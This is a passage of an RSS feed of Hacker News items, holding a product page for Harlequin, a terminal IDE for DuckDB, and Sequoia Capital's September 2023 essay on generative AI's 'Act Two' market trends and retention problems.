720px"></figure><p>Liked this post? If so, drop a reply on the <a href="https://twitter.com/aditya_baradwaj/status/1704546813817024907?ref=adityabaradwaj.com">Twitter thread</a> with what you want to hear about next!</p>
    </div>

    

</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Harlequin: DuckDB IDE for the terminal (289 pts)]]></title>
            <link>https://harlequin.sh/</link>
            <guid>37588526</guid>
            <pubDate>Wed, 20 Sep 2023 19:02:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://harlequin.sh/">https://harlequin.sh/</a>, See on <a href="https://news.ycombinator.com/item?id=37588526">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><nav><div> <p><span> <span>The DuckDB IDE for Your Terminal.</span></span></p></div>  </nav> <main><h2 data-svelte-h="svelte-1ltg9s5">Portable, powerful, colorful.</h2> <p data-svelte-h="svelte-zeyac5">A drop-in replacement for the DuckDB CLI.</p>  <img src="https://harlequin.sh/_app/immutable/assets/monokai.20be51a1.svg" alt="A screenshot showing the interface and features of Harlequin."> <h2 data-svelte-h="svelte-6dpwsj">Runs Anywhere.</h2> <p data-svelte-h="svelte-uggzqi">Any shell, any terminal, any machine. Fish in tmux on Alpine over SSH? Sure.
  Windows cmd? Yep.</p> <ul><li> </li><li> </li><li> </li><li> </li><li> </li><li> </li><li> </li><li> </li><li> </li><li> </li><li> </li></ul> <h2 data-svelte-h="svelte-1uj5341">Does SQL IDE Stuff.</h2> <p data-svelte-h="svelte-1stw158">The features you'd expect from an IDE, delightfully running right in your
  terminal.</p> <ul><li><div><h3>Data Catalog</h3> <p>View tables, columns, and their types across one or more attached databases.</p></div></li> <li><div><h3>Query Editor</h3> <p>A full-featured editor: open, save, format, cut, copy, paste, and more. Supports multiple tabbed buffers!</p></div></li> <li><div><h3>Results Viewer</h3> <p>View up to 10k results in an interactive table. Multiple queries loaded into separate tabs.</p></div></li> <li><div><h3>MotherDuck Support</h3> <p>Connect to any MotherDuck database in local or SaaS mode.</p></div></li> <li><div><h3>Full Screen</h3> <p>Need more room? Press F10 to view the Editor or Results in full-screen mode.</p></div></li> <li><div><h3>Results Export</h3> <p>Export query results and configure the export using a helpful UI.</p></div></li></ul> <h2 id="themes" data-svelte-h="svelte-wztx5h">Looks nice.</h2> <p data-svelte-h="svelte-19zxe54">Choose from dozens of <a href="https://pygments.org/styles/" target="_blank">styles</a>.</p> <ul><li><a href="https://harlequin.sh/_app/immutable/assets/arduino.6cb6ba6e.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/dracula.7331770a.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/emacs.258e2d03.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/fruity.e5c651ae.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/github-dark.3e595acd.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/gruvbox-dark.c57ea619.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/gruvbox-light.8fcc9b1b.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/igor.332eecf4.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/inkpot.1988cc50.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/lightbulb.c7f31036.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/material.beb7eff9.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/monokai.20be51a1.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/native.763b291d.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/nord-darker.621bb21a.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/one-dark.0db2542f.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/perldoc.e2d8296c.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/rrt.4aef9e0f.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/solarized-dark.48668f70.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/solarized-light.961cc9c2.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/stata-dark.abda9dcd.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/vs.01c66e70.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/zenburn.82aeeebe.svg" target="_blank"></a> </li></ul> <h2 data-svelte-h="svelte-1ehpzy">Join the Flock.</h2> <p data-svelte-h="svelte-10r3db">Thousands are using Harlequin. Join them with <code>pipx install harlequin</code>.</p> <ul><li> </li><li> </li><li> </li></ul></main> </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Generative AI's Act Two (101 pts)]]></title>
            <link>https://www.sequoiacap.com/article/generative-ai-act-two/</link>
            <guid>37588520</guid>
            <pubDate>Wed, 20 Sep 2023 19:02:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.sequoiacap.com/article/generative-ai-act-two/">https://www.sequoiacap.com/article/generative-ai-act-two/</a>, See on <a href="https://news.ycombinator.com/item?id=37588520">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main">
		<article>
	
<section data-color-mode="dark"><video id="hero_featured-video" loop="" muted="" playsinline=""><source data-id="15641" src="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/genai-act2-hero.mp4" type="video/mp4"></video><div data-grid-columns="2"><div>


<p><span>
Animation: James Buckhouse, Midjourney and Runway</span>


<time datetime="2023-09-20T07:00:00-07:00">
Published September 20, 2023</time>
</p></div><div><p>One year ago, we published a hypothesis that generative AI would become a profound platform shift in technology. Then came the firestorm.</p></div></div></section>



<section>
<p>Scientists, historians and economists have long studied the optimal conditions that create a Cambrian explosion of innovation. In generative AI, we have reached a modern marvel, our generation’s space race.</p>



<p>This moment has been decades in the making. Six decades of Moore’s Law has given us the compute horsepower to process exaflops of data. Four decades of the internet (accelerated by COVID) has given us trillions of tokens’ worth of training data. Two decades of mobile and cloud computing has given every human a supercomputer in the palm of our hands. In other words, decades of technological progress have accumulated to create the necessary conditions for generative AI to take flight.</p>



<p>ChatGPT’s rise was the spark that lit the fuse, unleashing a density and fervor of innovation that we have not seen in years—perhaps since the early days of the internet. The breathless excitement was especially visceral in “Cerebral Valley,” where AI researchers reached rockstar status and hacker houses were filled to the brim each weekend with new autonomous agents and companionship chatbots. AI researchers transformed from the proverbial “hacker in the garage” to special forces units commanding billions of dollars of compute. The arXiv printing press has become so prolific that researchers have jokingly called for a pause on new publications so they can catch up.</p>



<p>But quickly, AI excitement turned to borderline hysteria. Suddenly, every company was an “AI copilot.” Our inboxes got filled up with undifferentiated pitches for “AI Salesforce” and “AI Adobe” and “AI Instagram.” The $100M pre-product seed round returned. We found ourselves in an unsustainable feeding frenzy of fundraising, talent wars and GPU procurement.&nbsp;</p>



<p>And sure enough, the cracks started to show. Artists and writers and singers challenged the legitimacy of machine-generated IP. Debates over ethics, regulation and looming superintelligence consumed Washington. And perhaps most worryingly, a whisper began to spread within Silicon Valley that generative AI was not actually useful. The products were falling far short of expectations, as evidenced by terrible user retention. End user demand began to plateau for many applications. Was this just another vaporware cycle?</p>



<p>The AI summer of discontent has sent critics gleefully grave dancing, reminiscent of the early days of the internet, where in 1998 one famous economist declared “By 2005, it will become clear that the Internet’s impact on the economy has been no greater than the fax machine’s.”</p>



<p>Make no mistake—despite the noise and the hysteria and the air of uncertainty and discontent,&nbsp; generative AI has already had a more successful start than SaaS, with &gt;$1 billion in revenue from startups alone (it took the SaaS market years, not months, to reach the same scale). Some applications have become household names: ChatGPT became the fastest-growing application with particularly strong product-market fit among students and developers; Midjourney became our collective creative muse and was reported to have reached hundreds of millions of dollars in revenue with a team of just eleven; and Character popularized AI entertainment and companionship and created the consumer “social” application we craved the most—with users spending two hours on average in-app.</p>



<p>Nonetheless, these early signs of success don’t change the reality that a lot of AI companies simply do not have product-market fit or a sustainable competitive advantage, and that the overall ebullience of the AI ecosystem is unsustainable.</p>



<p>Now that the dust has settled for a bit, we thought it would be an opportune moment to zoom out and reflect on generative AI—where we find ourselves today, and where we’re possibly headed.&nbsp;</p>



<h2 id="h-towards-act-two">Towards Act Two</h2>



<p>Generative AI’s first year out the gate—“Act 1”—came from the <em>technology-out</em>. We discovered a new “hammer”—foundation models—and unleashed a wave of novelty apps that were lightweight demonstrations of cool new technology.&nbsp;</p>



<p>We now believe the market is entering “Act 2”—which will be from the <em>customer-back</em>. Act 2 will solve human problems end-to-end. These applications are different in nature than the first apps out of the gate. They tend to use foundation models as a piece of a more comprehensive solution rather than the entire solution. They introduce new editing interfaces, making the workflows stickier and the outputs better. They are often multi-modal.</p>



<p>The market is already beginning to transition from “Act 1” to “Act 2.” Examples of companies entering “Act 2” include <a href="http://harvey.ai/">Harvey</a>, which is building custom LLMs for elite law firms; <a href="http://glean.com/">Glean</a>, which is crawling and indexing our workspaces to make Generative AI more relevant at work; and <a href="http://character.ai/">Character</a> and <a href="https://apps.apple.com/us/app/ava-your-digital-friend/id6446257579">Ava</a>, which are creating digital companions.&nbsp;</p>



<h2 id="h-market-map">Market Map</h2>



<p>Our updated generative AI market map is below.&nbsp;</p>



<p>Unlike last year’s map, we have chosen to organize this map by use case rather than by model modality. This reflects two important thrusts in the market: Generative AI’s evolution from technology hammer to actual use cases and value, and the increasingly multimodal nature of generative AI applications.</p>
</section>



<figure><img decoding="async" src="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png" alt="" width="1200" srcset="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png 2160w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=225,300 225w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=768,1024 768w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=1152,1536 1152w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=1536,2048 1536w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=113,150 113w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=1920,2560 1920w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=680,907 680w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=930,1240 930w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=1440,1920 1440w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=480,640 480w" sizes="(max-width: 2160px) 100vw, 2160px"></figure>



<section>
<p>In addition, we have included a new LLM developer stack that reflects the compute and tooling vendors that companies are turning to as they build generative AI applications in production.</p>
</section>



<figure><img decoding="async" src="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png" alt="" width="1200" srcset="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png 2160w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=225,300 225w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=768,1024 768w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=1152,1536 1152w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=1536,2048 1536w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=113,150 113w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=1920,2560 1920w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=680,907 680w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=930,1240 930w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=1440,1920 1440w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=480,640 480w" sizes="(max-width: 2160px) 100vw, 2160px"></figure>



<section>
<h2>Revisiting Our Thesis</h2>



<p>Our original <a href="https://www.sequoiacap.com/article/generative-ai-a-creative-new-world/">essay</a> laid out a thesis for the generative AI market opportunity and a hypothesis for how the market would unfold. How did we do?</p>



<p>Here’s what we got wrong:</p>



<ol>
<li><strong>Things happened quickly.</strong> Last year, we anticipated it would be nearly a decade before we had intern-level code generation, Hollywood-quality videos or human quality speech that didn’t sound mechanical. But a quick listen to Eleven Labs’ voices on TikTok or Runway’s AI film festival makes it clear that the future has arrived at warp speed. Even 3D models, gaming and music are becoming good, <em>quickly</em>.&nbsp;</li>



<li><strong>The bottleneck is on the supply side. </strong>We did not anticipate the extent to which end user demand would outstrip GPU supply. The bottleneck to many companies’ growth quickly became not customer demand but access to the latest GPUs from Nvidia. Long wait times became the norm, and a simple business model emerged: pay a subscription fee to skip the line and access better models.&nbsp;</li>



<li><strong>Vertical separation hasn’t happened yet</strong>. We still believe that there will be a separation between the “application layer” companies and foundation model providers, with model companies specializing in scale and research and application layer companies specializing in product and UI. In reality, that separation hasn’t cleanly happened yet. In fact, the most successful user-facing applications out of the gate have been vertically integrated.</li>



<li><strong>Cutthroat competitive environment and swiftness of the incumbent response.</strong> Last year, there were a few overcrowded categories of the competitive landscape (notably image generation and copywriting), but by and large the market was whitespace. Today, many corners of the competitive landscape have more competition than opportunity. The swiftness of the incumbent response, from Google’s Duet and Bard to Adobe’s Firefly—and the willingness of incumbents to finally go “risk on”—has magnified the competitive heat. Even in the foundation model layer, we are seeing customers set up their infrastructure to be agnostic between different vendors.&nbsp;</li>



<li><strong>The moats are in the customers, not the data. </strong>We predicted that the best generative AI companies could generate a sustainable competitive advantage through a data flywheel: more usage → more data → better model → more usage. While this is still somewhat true, especially in domains with very specialized and hard-to-get data, the “data moats” are on shaky ground: the data that application companies generate does not create an insurmountable moat, and the next generations of foundation models may very well obliterate any data moats that startups generate. Rather, <em>workflows</em> and <em>user networks</em> seem to be creating more durable sources of competitive advantage.</li>
</ol>



<p>Here’s what we got right:</p>



<ol>
<li><strong>Generative AI is a thing. </strong>Suddenly, every developer was working on a generative AI application and every enterprise buyer was demanding it. The market even kept the “generative AI” moniker. Talent flowed into the market, as did venture capital dollars. Generative AI even became a pop culture phenomenon in viral videos like “Harry Potter Balenciaga” or the Drake imitation song “Heart on My Sleeve” by Ghostwriter which has become a chart-topping hit.</li>



<li><strong>The first killer apps emerged</strong>. It’s been well documented that ChatGPT was the fastest application to reach 100M MAU—and it did so organically in just 6 weeks. By contrast, Instagram took 2.5 years, WhatsApp took 3.5 years, and YouTube and Facebook took 4 years to reach that level of user demand. But ChatGPT is not an isolated phenomenon. The depth of engagement of Character AI (2 hour average session time), the productivity benefits of Github Copilot (55% more efficient), and the monetization path of Midjourney (hundreds of millions of dollars in revenue) all suggest that the first cohort of killer apps has arrived.</li>



<li><strong>Developers are the key</strong>. One of the core insights of developer-first companies like Stripe or Unity has been that developer access opens up use cases you could not even imagine. In the last several quarters, we have been pitched everything from music generation communities to AI matchmakers to AI customer support agents.</li>



<li><strong>The form factor is evolving. </strong>The first versions of AI applications have largely been autocomplete and first drafts, but these form factors are now growing in complexity. Midjourney’s introduction of camera panning and infilling is a nice illustration of how the generative AI-first user experience has grown richer. Across the board, form factors are evolving from individual to system-level productivity and from human-in-the-loop to execution-oriented agentic systems.</li>



<li><strong>Copyright and ethics and existential dread</strong>. The debate has roared on these hot-button topics. Artists and writers and musicians are split, with some creators rightfully outraged that others are profiting off derivative work, and some creators embracing the new AI reality (Grimes’ profit-sharing proposition and James Buckhouse’s optimism about becoming part of the <a href="https://buckhouse.medium.com/augmented-imagination-a3f4519f9784">creative genome</a> come to mind). No startup wants to be the <a href="https://www.fastcompany.com/90942310/ai-napster-who-going-to-own-it-next">Napster or Limewire to the eventual Spotify</a> (h/t Jason Boehmig). The rules are opaque: Japan has declared that content used to train AI has no IP rights, while Europe has proposed heavy-handed regulation.&nbsp;</li>
</ol>



<h2>Where do we stand now? Generative AI’s Value Problem</h2>



<p>Generative AI is not lacking in use cases or customer demand. Users crave AI that makes their jobs easier and their work products better, which is why they have flocked to applications in record-setting droves (in spite of a lack of natural distribution).&nbsp;</p>



<figure><img decoding="async" src="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?w=1024" alt="" width="620" srcset="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png 1200w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?resize=300,167 300w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?resize=768,427 768w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?resize=1024,569 1024w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?resize=220,122 220w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?resize=680,378 680w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?resize=930,517 930w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-100m.png?resize=480,267 480w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>



<p>But do people stick around? Not really. The below chart compares the month 1 mobile app retention of AI-first applications to existing companies.&nbsp;</p>



<figure><img decoding="async" src="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?w=824" alt="" width="620" srcset="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png 1200w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?resize=241,300 241w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?resize=768,955 768w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?resize=824,1024 824w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?resize=121,150 121w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?resize=680,845 680w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?resize=930,1156 930w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-retention.png?resize=480,597 480w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>



<p>User engagement is also lackluster. Some of the best consumer companies have 60-65% DAU/MAU; WhatsApp’s is 85%. By contrast, generative AI apps have a median of 14% (with the notable exception of Character and the “AI companionship” category). This means that users are not finding enough value in Generative AI products to use them every day yet.</p>



<figure><img decoding="async" src="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?w=789" alt="" width="620" srcset="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png 1200w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=231,300 231w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=768,997 768w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=789,1024 789w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=1183,1536 1183w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=116,150 116w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=680,883 680w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=930,1207 930w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-dau-mau.png?resize=480,623 480w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>



<p>In short, generative AI’s biggest problem is not finding use cases or demand or distribution, it is proving value. As our colleague David Cahn writes, “the <a href="https://www.sequoiacap.com/article/follow-the-gpus-perspective/">$200B question</a> is: What are you going to use all this infrastructure to do? How is it going to change people’s lives?” The path to building enduring businesses will require fixing the retention problem and generating deep enough value for customers that they stick and become daily active users.</p>



<p>Let’s not despair. Generative AI is still in its “awkward teenage years.” There are glimpses of brilliance, and when the products fall short of expectations the failures are often reliable, repeatable and fixable. Our work is cut out for us.&nbsp;</p>



<h2>Act Two: A Shared Playbook</h2>



<p>Founders are embarking on the hard work of prompt engineering, fine tuning and dataset curation to make their AI products *good*. Brick by brick, they are building flashy demos into whole product experiences. And meanwhile, the foundation model substrate continues to brim with research and innovation.</p>



<p>A shared playbook is developing as companies figure out the path to enduring value. We now have shared techniques to make models useful, as well as emerging UI paradigms that will shape generative AI’s second act.</p>



<p><strong>The Model Development Stack</strong></p>



<ul>
<li><strong>Emerging reasoning techniques like chain-of-thought, tree-of-thought and reflexion</strong> are improving models’ ability to perform richer, more complex reasoning tasks, closing the gap between customer expectations and model capabilities. Developers are using frameworks like <a href="http://langchain.com/">Langchain</a> to invoke and debug more complex multi-chain sequences.</li>



<li><strong>Transfer learning techniques like RLHF and fine-tuning </strong>are becoming more accessible, especially with the recent availability of fine-tuning for GPT-3.5 and Llama-2, which means that companies can adapt foundation models to their specific domains and improve from user feedback. Developers are downloading open-source models from <a href="http://huggingface.co/">Hugging Face</a> and fine-tuning them to achieve <a href="https://www.anyscale.com/blog/fine-tuning-llms-lora-or-full-parameter-an-in-depth-analysis-with-llama-2">quality</a> performance.</li>



<li><strong>Retrieval-augmented generation</strong> is bringing in context about the business or the user, reducing hallucinations and increasing truthfulness and usefulness. Vector databases from companies like <a href="http://pinecone.io/">Pinecone</a> have become the infrastructure backbone for RAG.</li>



<li><strong>New developer tools and application frameworks </strong>are giving companies reusable building blocks to create more advanced AI applications and helping developers evaluate, improve and monitor the performance of AI models in production, including LLMOps tools like <a href="https://www.langchain.com/langsmith">Langsmith</a> and <a href="http://wandb.ai/">Weights &amp; Biases</a>&nbsp;</li>



<li><strong>AI-first infrastructure companies </strong>like <a href="http://corweave.com/">Coreweave</a>, <a href="https://lambdalabs.com/">Lambda Labs</a>, <a href="https://mlfoundry.com/">Foundry</a>, <a href="https://replicate.com/">Replicate</a> and <a href="https://modal.com/">Modal</a> are unbundling the public clouds and providing what AI companies need most: plentiful GPUs at a reasonable cost, available on-demand and highly scalable, with a nice PaaS developer experience.</li>
</ul>



<p>Together, these techniques should close the expectations vs reality gap for models as the underlying foundation models simultaneously improve. But making the models great is only half the battle. The playbook for a generative AI-first user experience is evolving as well:</p>



<p><strong>Emerging Product Blueprints</strong></p>



<ul>
<li><strong>Generative interfaces</strong>. A text-based conversational user experience is the default interface on top of an LLM. Gradually, newer form factors are entering the arsenal, from Perplexity’s <a href="https://twitter.com/alexgraveley/status/1659276299091812353">generative user interfaces</a> to new modalities like human-sounding voices from Inflection AI.&nbsp;</li>



<li><strong>New editing experiences: from Copilot to Director’s Mode</strong>. As we advance from zero-shot to <a href="https://thezbook.com/ask-adjust-the-future-of-productivity-interfaces">ask-and-adjust</a> (h/t Zach Lloyd), generative AI companies are inventing a new set of knobs and switches that look very different from traditional editing workflows. Midjourney’s new panning commands and Runway’s Director’s Mode create new camera-like editing experiences. Eleven Labs is making it possible to manipulate voices through prompting.</li>



<li><strong>Increasingly sophisticated agentic systems. </strong>Generative AI applications are increasingly not just autocomplete or first drafts for human review; they now have the autonomy to problem-solve, access external tools and solve problems end-to-end on our behalf. We are steadily progressing from level 0 to level 5 autonomy.&nbsp;</li>



<li><strong>System-wide optimization</strong>. Rather than embed in a single human user’s workflow and make that individual more efficient, some companies are directly tackling the system-wide optimization problem. Can you pick off a chunk of support tickets or pull requests and autonomously solve them, thereby making the whole system more effective?</li>
</ul>



<h2>Parting Thoughts</h2>



<p>As we approach the <a href="https://www.sequoiacap.com/article/ai-paradox-perspective/">frontier paradox</a> and as the novelty of transformers and diffusion models dies down, the nature of the generative AI market is evolving. Hype and flash are giving way to real value and whole product experiences.</p>



<p>At Sequoia we remain steadfast believers in generative AI. The necessary conditions for this market to take flight have accumulated over the span of decades, and the market is finally here. The emergence of killer applications and the sheer magnitude of end user demand has deepened our conviction in the market.</p>



<p>However, Amara’s Law—the phenomenon that we tend to overestimate the effect of a technology in the short run and underestimate the effect in the long run—is running its course. We are applying patience and judgment in our investment decisions, with careful attention to how founders are solving the value problem. The shared playbook companies are using to push the boundaries on model performance and product experiences gives us optimism on generative AI’s second act.</p>



<p><br><em>If you are building in the AI market with an eye towards value and whole product experiences, we would love to hear from you. Please email Sonya (<a href="mailto:sonya@sequoiacap.com">sonya@sequoiacap.com</a>) and Pat (</em><a href="mailto:grady@sequoiacap.com"><em>grady@sequoiacap.com</em></a><em>). Our third coauthor does not have an email address yet, sadly :-).</em></p>
</section>











<div data-columns="12">

					<p>
						JOIN OUR MAILING LIST					</p>

					<h2>
						Get the best stories from the Sequoia community.					</h2>

					
					
					

				</div>
</article>
	</div></div>]]></description>
        </item>
    </channel>
</rss>